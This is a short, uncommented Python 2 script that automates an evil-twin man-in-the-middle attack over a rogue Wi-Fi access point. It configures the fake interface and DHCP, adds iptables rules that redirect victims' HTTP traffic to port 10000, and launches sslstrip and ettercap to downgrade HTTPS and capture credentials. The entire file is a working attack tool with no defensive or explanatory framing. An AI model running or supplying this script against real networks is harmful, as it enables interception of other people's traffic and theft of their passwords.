import os 
import subprocess

class b:
    purp = '\033[95m'
    blue = '\033[94m'
    green = '\033[92m'
    yell = '\033[93m'
    red = '\033[91m'
    white = '\033[0m'
    dick = '\033[1m'
    under = '\033[4m'

os.system("clear")
os.system("route -n")
print ""
gtw = raw_input( b.green + " Enter your Gateway:     " + b.white)

os.system("clear")
os.system("airmon-ng")
defi = raw_input(" Default Interface:     ")

os.system("ifconfig at0 192.168.1.1 netmask 255.255.255.0")
os.system("ifconfig at0 mtu 1400")
os.system("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -t nat -A PREROUTING -p udp -j DNAT --to %s" % gtw)
os.system("iptables -P FORWARD ACCEPT")
os.system("iptables --append FORWARD --in-interface at0 -j ACCEPT")
os.system("iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE" % defi)
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
os.system("dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0")
os.system("/etc/init.d/isc-dhcp-server start")

subprocess.call(['gnome-terminal', '-e', 'sslstrip -f -p -k 10000'])
subprocess.call(['gnome-terminal', '-e', 'ettercap -p -u -T -q -i at0'])
